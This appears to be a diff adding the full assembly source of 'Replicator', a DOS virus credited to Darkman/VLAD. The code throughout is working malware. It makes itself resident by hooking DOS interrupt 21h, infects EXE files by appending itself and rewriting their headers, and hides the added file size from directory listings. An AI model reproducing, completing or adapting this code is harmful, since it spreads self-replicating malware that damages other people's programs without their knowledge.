@@ -1,0 +1,391 @@
+;                             Darkman/VLAD
+;                           Proudly Presents
+;                         R E P L I C A T O R
+;              - Thanks to Bugsy/OBSESSiON for the help -
+
+replicator   segment
+             assume  cs:replicator,ds:replicator,es:replicator
+             org     00h
+
+code:
+             call    viruscode
+viruscode:
+             pop     bp                  ; Load BP from stack
+             sub     bp,offset viruscode ; BP = delta offset
+
+             push    ds                  ; Save DS at stack
+             push    es                  ; Save ES at stack
+
+             mov     ax,6304h            ; Replicator service
+             int     21h                 ; Do it!
+             cmp     ax,bx               ; Already resident?
+             je      repexit             ; Equal? Jump to repexit
+
+             mov     ax,es
+             dec     ax                  ; Decrease AX
+             mov     ds,ax               ; DS = segment of programs MCB
+
+             cmp     byte ptr ds:[00h],'Z'
+             jne     repexit             ; Not last in chain? Jump to repexit
+             sub     word ptr ds:[03h],(memoryend-code+0fh)/10h
+             sub     word ptr ds:[12h],(memoryend-code+0fh)/10h
+             add     ax,ds:[03h]         ; AX = MCB + size of memory block
+             inc     ax                  ; AX = first usable MCB segment
+
+             cld                         ; Clear direction flag
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             mov     es,ax               ; ES = first usable program segment
+             mov     cx,(codeend-code)   ; Move 651 bytes
+             xor     di,di               ; Clear DI
+             lea     si,[bp+code]        ; SI = offset of code
+             rep     movsb               ; Move virus to high memory
+
+             xor     ax,ax               ; Clear AX
+             mov     ds,ax               ; DS = segment of interrupt table
+             xchg    ax,ds:[21h*04h]     ; Load and store offset of INT 21h
+             mov     es:[int21off],ax    ; Store offset of INT 21h
+             mov     ax,1eh              ; AX = segment of hole in memory
+             xchg    ax,ds:[21h*04h+02h] ; Load and store segment of INT 21h
+             mov     es:[int21seg],ax    ; Store segment of INT 21h
+
+             mov     byte ptr ds:[1e0h],0eah
+             mov     word ptr ds:[1e1h],offset virusint21
+             mov     ds:[1e3h],es        ; Store segment of virusint21
+repexit:
+             pop     es                  ; Load ES from stack
+             pop     ds                  ; Load DS from stack
+
+             mov     ax,es
+             add     ax,10h              ; Beginning of EXE file
+             add     word ptr cs:[bp+csip+02h],ax
+
+             cli                         ; Clear interrupt-enable flag
+             mov     sp,word ptr cs:[bp+sssp]
+             add     ax,word ptr cs:[bp+sssp+02h]
+             mov     ss,ax
+             sti                         ; Store interrupt-enable flag
+
+             xor     ax,ax               ; Clear AX
+             mov     bx,ax               ; Clear BX
+             mov     cx,ax               ; Clear CX
+             mov     dx,ax               ; Clear DX
+             mov     di,ax               ; Clear DI
+             mov     si,ax               ; Clear SI
+             mov     bp,ax               ; Clear BP
+             jmp     $+02h               ; Flush prefetch queue
+
+             db      0eah                ; Object code of jump far
+csip         dd      0fff00000h          ; CS:IP of infected file
+sssp         dd      ?                   ; SS:SP of infected file
+
+virusint21   proc    near                ; Interrupt 21h of Replicator
+             cmp     ax,6304h            ; Replicator service?
+             je      repservice          ; Equal? Jump to repservice
+             cmp     ah,0eh              ; Select default drive?
+             je      setupfind           ; Equal? Jump to setupfind
+             cmp     ah,3bh              ; Change directory?
+             je      setupfind           ; Equal? Jump to setupfind
+             cmp     ah,4eh              ; Find first matching file (DTA)?
+             je      dtastealth          ; Equal? Jump to dtastealth
+             cmp     ah,4fh              ; Find next matching file (DTA)?
+             je      dtastealth          ; Equal? Jump to dtastealth
+             cmp     ah,11h              ; Find first matching file (FCB)?
+             je      fcbstealth          ; Equal? Jump to fcbstealth
+             cmp     ah,12h              ; Find next matching file (FCB)?
+             je      fcbstealth          ; Equal? Jump to fcbstealth
+             jmp     int21exit
+setupfind:
+             popf                        ; Load flags from stack
+             pushf                       ; Save falgs at stack
+
+             call    simint21
+
+             push    ax                  ; Save AX at stack
+             push    bx                  ; Save BX at stack
+             push    cx                  ; Save CX at stack
+             push    dx                  ; Save DX at stack
+             push    di                  ; Save DI at stack
+             push    si                  ; Save SI at stack
+             push    ds                  ; Save DS at stack
+             push    es                  ; Save ES at stack
+             pushf                       ; Save flags at stack
+
+             mov     ah,2fh              ; Get disk transfer address
+             call    simint21            ; Do it!
+             push    bx                  ; Save BX at stack
+             push    es                  ; Save ES at stack
+
+             mov     ah,1ah              ; Set disk transfer address
+             lea     dx,dta              ; DX = offset of dta
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             call    simint21            ; Do it!
+
+             mov     ah,4eh              ; Find first matching file (DTA)
+             mov     cx,27h              ; Set file attribute
+             lea     dx,filespec         ; DX = offset of filespec
+findnext:
+             call    simint21            ; Do it!
+             jc      nomorefiles         ; Error? Jump to nomorefiles
+
+             cmp     filedate,0022h      ; Allready infected?
+             je      dontinfect          ; Equal? Jump to dontinfect
+
+             call    infectfile
+dontinfect:
+             mov     ah,4fh              ; Find next matching file (DTA)
+             jmp     findnext
+nomorefiles:
+             pop     ds                  ; Load DS from stack
+             pop     dx                  ; Load DX from stack
+             mov     ah,1ah              ; Set disk transfer address
+             call    simint21            ; Do it!
+
+             popf                        ; Load flags from stack
+             pop     es                  ; Load ES from stack
+             pop     ds                  ; Load DS from stack
+             pop     si                  ; Load SI from stack
+             pop     di                  ; Load DI from stack
+             pop     dx                  ; Load DX from stack
+             pop     cx                  ; Load CX from stack
+             pop     bx                  ; Load BX from stack
+             pop     ax                  ; Load AX from stack
+
+             retf    02h                 ; Return far and pop a word!
+int21exit:
+             jmp     dword ptr cs:int21off
+repservice:
+             mov     bx,ax
+             iret                        ; Interrupt return!
+dtastealth:
+             call    simint21
+             pushf                       ; Save flags at stack
+             jc      stealthexit         ; Error? Jump to stealthexit
+
+             push    ax                  ; Save AX at stack
+             push    bx                  ; Save BX at stack
+             push    es                  ; Save ES at stack
+
+             mov     ah,2fh              ; Get disk transfer address
+             call    simint21
+
+             cmp     word ptr es:[bx+18h],0022h
+             jne     dontstealth         ; Not equal? Jump to dontstealth
+
+             add     bx,1ah              ; BX = offset of file size
+             jmp     stealth
+fcbstealth:
+             call    simint21
+             pushf                       ; Save flags at stack
+             or      al,al               ; File name match found?
+             jne     stealthexit         ; Not equal? Jump to stealthexit
+
+             push    ax                  ; Save AX at stack
+             push    bx                  ; Save BX at stack
+             push    es                  ; Save ES at stack
+
+             mov     ah,2fh              ; Get disk transfer address
+             call    simint21
+
+             cmp     byte ptr es:[bx],0ffh
+             jne     notextended         ; Not equal? Jump to notextended
+
+             add     bx,07h              ; SI = offset of normal FCB
+notextended:
+             cmp     word ptr es:[bx+19h],0022h
+             jne     dontstealth         ; Not equal? Jump to dontstealth
+
+             add     bx,1dh              ; BX = offset of file size
+stealth:
+             sub     es:[bx],(codeend-code)
+             sbb     word ptr es:[bx],00h
+dontstealth:
+             pop     es                  ; Load ES from stack
+             pop     ax                  ; Load AX from stack
+             pop     bx                  ; Load BX from stack
+stealthexit:
+             popf                        ; Load flags from stack
+
+             retf    02h                 ; Return far and pop a word!
+             endp
+
+infectfile   proc    near                ; Infect a EXE file
+             xor     ax,ax               ; Clear AX
+             mov     ds,ax               ; DS = segment of interrupt table
+             push    ds:[24h*04h]        ; Save INT 24h offset at stack
+             push    ds:[24h*04h+02h]    ; Save INT 24h segment at stack
+             mov     word ptr ds:[24h*04h],offset virusint24
+             mov     ds:[24h*04h+02h],cs ; Intercept interrupt 24h
+
+             mov     ax,3d00h            ; Open file (read)
+             lea     dx,filename         ; DX = offset of filename
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+             call    simint21            ; Do it!
+
+             xchg    ax,bx               ; Exchange AX with BX
+
+             mov     ax,1220h            ; Get system file table number
+             int     2fh                 ; Do it! (multiplex)
+
+             push    bx                  ; Save BX at stack
+             mov     ax,1216h            ; Get address of system FCB
+             mov     bl,es:[di]          ; BL = system file table entry
+             int     2fh                 ; Do it! (multiplex)
+             pop     bx                  ; Load BX from stack
+
+             mov     byte ptr es:[di+02h],02h
+
+             mov     ah,3fh              ; Read from file
+             mov     cx,19h              ; Read 25 bytes
+             lea     dx,exeheader        ; DX = offset of exeheader
+             mov     si,dx
+             call    simint21            ; Do it!
+
+             cmp     word ptr [si],'MZ'  ; EXE file?
+             je      infect              ; Equal? Jump to infect
+             cmp     word ptr [si],'ZM'  ; EXE file?
+             je      infect              ; Equal? Jump to infect
+             jmp     closefile
+infect:
+             mov     ax,4202h            ; Move file pointer to the end
+             cwd                         ; Clear DX
+             mov     cx,dx               ; Clear CX
+             call    simint21            ; Do it!
+
+             push    bx                  ; Save BX at stack
+             mov     bx,ax
+             mov     cx,dx
+
+             cmp     word ptr [si+02h],00h
+             je      dontdecpage         ; Equal? Jump to dontdecpage
+
+             dec     word ptr [si+04h]   ; Decrease pages in file
+dontdecpage:
+             mov     ax,200h
+             mul     word ptr [si+04h]   ; Divide by pages
+             add     ax,[si+02h]         ; Add bytes on last page
+             adc     dx,00h              ; Convert to 32 bit
+
+             cmp     ax,bx               ; Internal overlay?
+             pop     bx                  ; Load bytes from stack
+             jne     closefile           ; Not equal? Jump to closefile
+             cmp     cx,dx               ; Internal overlay?
+             jne     closefile           ; Not equal? Jump to closefile
+
+             cmp     byte ptr [si+18h],40h
+             je      closefile           ; Windows file? Jump to closefile
+
+             push    ax                  ; Save AX at stack
+             push    dx                  ; Save DX at stack
+
+             push    si                  ; Save SI at stack
+
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+
+             add     si,0eh              ; SI = offset of SS:SP
+             lea     di,sssp             ; DI = offset of sssp
+
+             movsw                       ; Store original SP
+             movsw                       ; Store original SS
+
+             inc     si                  ; SI = offset of CS:IP \
+             inc     si                  ; "  "   "    "    "   /
+             lea     di,csip             ; DI = offset of csip
+
+             movsw                       ; Store original IP
+             movsw                       ; Store original CS
+
+             pop     si                  ; Load SI from stack
+
+             mov     cx,10h
+             div     cx                  ; Convert bytes to paragraphs
+
+             sub     ax,word ptr [si+08h]
+
+             mov     word ptr [si+14h],dx
+             mov     word ptr [si+16h],ax
+
+             add     ax,(memoryend-code+0fh)/10h
+
+             mov     word ptr [si+0eh],ax
+
+             pop     dx                  ; Load DX from stack
+             pop     ax                  ; Load AX from stack
+
+             add     ax,(codeend-code)   ; Add the length of the virus
+             adc     dx,00h              ; Convert to 32 bit
+
+             mov     cx,200h
+             div     cx                  ; Divide by pages
+
+             or      dx,dx               ; No bytes on last page?
+             je      dontincpage         ; Equal? Jump to dontincpage
+
+             inc     ax                  ; Increase AX
+dontincpage:
+             mov     word ptr [si+04h],ax
+             mov     word ptr [si+02h],dx
+
+             mov     ah,40h              ; Write to file
+             mov     cx,(codeend-code)   ; Write 651 bytes
+             cwd                         ; DX = offset of code
+             call    simint21            ; Do it!
+
+             mov     ax,4200h            ; Move file pointer to the beginning
+             cwd                         ; Clear DX
+             mov     cx,dx               ; Clear CX
+             call    simint21            ; Do it!
+
+             mov     ah,40h              ; Write to file
+             mov     cx,18h              ; Write 29 bytes
+             mov     dx,si               ; DX = offset of exeheader
+             call    simint21            ; Do it!
+
+             mov     ax,5701h            ; Set file's date and time
+             mov     cx,filetime         ; Restore original file time
+             mov     dx,0022h            ; Set infection marker
+             call    simint21            ; Do it!
+closefile:
+             mov     ah,3eh              ; Close file
+             call    simint21            ; Do it!
+
+             xor     ax,ax               ; Clear AX
+             mov     es,ax               ; ES = segment of interrupt table
+             pop     es:[24h*04h]        ; Save INT 24h offset at stack
+             pop     es:[24h*04h+02h]    ; Save INT 24h segment at stack
+
+             ret                         ; Return!
+             endp
+
+virusint24   proc    near                ; Interrupt 24h of Replicator
+             mov     al,3                ; Fail system call in progress
+             iret                        ; Interrupt return!
+             endp
+
+simint21     proc    near                ; Simulate interrupt 21h
+             pushf                       ; Save flags at stack
+callfar      db      9ah                 ; Object code of a far call
+int21off     dw      ?                   ; Offset of interrupt 21h
+int21seg     dw      ?                   ; Segment of interrupt 21h
+             ret                         ; Return!
+             endp
+
+filespec     db      '*.EXE',00h         ; File specification
+virusname    db      '[Replicator] '     ; Name of the virus
+virusauthor  db      '[Darkman/VLAD]'    ; Author of the virus
+codeend:
+exeheader    db      19h dup(?)          ; EXE header
+dta:
+             db      15h dup(?)          ; Used by DOS for find next-process
+fileattr     db      ?                   ; File attribute
+filetime     dw      ?                   ; File time
+filedate     dw      ?                   ; File date
+filesize     dd      ?                   ; File size
+filename     db      0dh dup(?)          ; File name
+memoryend:
+
+replicator   ends
+end          code
